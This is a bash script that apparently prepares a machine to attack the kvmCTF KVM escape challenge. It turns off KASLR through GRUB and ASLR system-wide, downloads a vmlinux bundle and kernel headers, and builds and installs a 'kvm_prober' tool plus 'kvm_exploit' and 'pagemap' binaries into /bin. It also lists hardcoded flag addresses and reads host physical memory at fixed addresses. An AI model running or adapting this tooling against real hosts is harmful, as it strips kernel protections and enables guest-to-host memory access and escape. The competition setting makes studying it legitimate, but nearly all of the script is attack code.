#!/bin/bash

echo "[*] clearing dmesg"
dmesg -c

echo "[*] disabling kaslr..."
if grep -qw "nokaslr" /proc/cmdline; then
    echo "[+] KASLR is DISABLED (nokaslr in cmdline)"
else
    echo "[!] KASLR is ENABLED - attempting to disable for next boot..."
    # Add nokaslr to GRUB if not already present
    if ! grep -qw "nokaslr" /etc/default/grub; then
         sed -i 's/^GRUB_CMDLINE_LINUX=\"/GRUB_CMDLINE_LINUX=\"nokaslr /' /etc/default/grub
         update-grub
        echo "[+] 'nokaslr' added to GRUB. You must reboot for KASLR to be disabled."
        echo "[+] Reboot now? (y/N)"
        read answer
        if [[ "$answer" =~ ^[Yy]$ ]]; then
             reboot
        else
            echo "[!] KASLR will remain enabled until you reboot."
        fi
    else
        echo "[*] 'nokaslr' already in /etc/default/grub. Just reboot to disable KASLR."
    fi
fi

echo -e "\n\033[1;36m[*] Ensuring environment is ready...\033[0m"
KERN_VER=$(uname -r)

### ===Install basic build tools===
apt update -y >/dev/null
apt install sudo git make gcc gdb tar pip xxd build-essential binutils linux-compiler-gcc-12-x86 linux-kbuild-6.1 wget -y >/dev/null || true
apt install -f -y >/dev/null

sleep 2
 if [ ! -f "/root/vmlinux" ]; then
     echo "[*] Downloading latest kvmctf bundle for vmlinux..."
     wget -q https://storage.googleapis.com/kvmctf/latest.tar.gz
     tar -xzf latest.tar.gz
     mv /root/kvm_probe/kvmctf-6.1.74/vmlinux/vmlinux /root
     echo "[+] vmlinux moved to /root"
 else
     echo "[+] /root/vmlinux already exists, skipping download."
fi

sleep 2
echo "[*] downloading necessary headers..."
wget -q https://debian.sipwise.com/debian-security/pool/main/l/linux/linux-headers-6.1.0-21-common_6.1.90-1_all.deb
wget -q https://debian.sipwise.com/debian-security/pool/main/l/linux/linux-headers-6.1.0-21-amd64_6.1.90-1_amd64.deb

### ===Install with verification===
sleep 2
echo "[*] Installing necessary headers..."
dpkg -i *.deb || true

sleep 2
echo "[*] getting kvm_prober setup..."
make
make install
cp kvm_prober /bin

sleep 2
echo "[*] allocating memory for kvm_prober..."
kvm_prober allocvqpage

sleep 2
echo "[*] host VA and PA addresses"
echo "Write flag address: 0xffffffff826279a8    0x64279a8"
echo "Read flag address:  0xffffffff82b5ee10    0x695ee10"

sleep 5
echo "[*] Write flags default value"
echo "deadbeef41424344"
echo "with little endian: 44434241efbeadde"

echo "Potential HPA 2 GPA = 0x3B000000"
sleep 2

echo "Disabling ASLR system-wide"
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

sleep 5
echo "[*] Host view @ 0x3C000000"
kvm_prober readhostphys 0x3C000000 64

sleep 5
echo "[*] Guest view @ 0x01000000"
kvm_prober readhostphys 0x01000000 64

echo "[*] Checking potential addresses for flags"

sleep 5

echo "compiling other exploits"

sleep 2

gcc -o kvm_exploit kvm_exploit.c

sleep 5

cp kvm_exploit /bin

sleep 5

gcc -o pagemap pagemap.c

sleep 5

cp pagemap /bin

sleep 5

sleep 5
echo "[*] Write flags default value"
echo "deadbeef41424344"
echo "with little endian: 44434241efbeadde"

sleep 5

echo "[*] testing kvm_prober readhostphys 0x76000000 4096"
kvm_prober readhostphys 0x76000000 4096
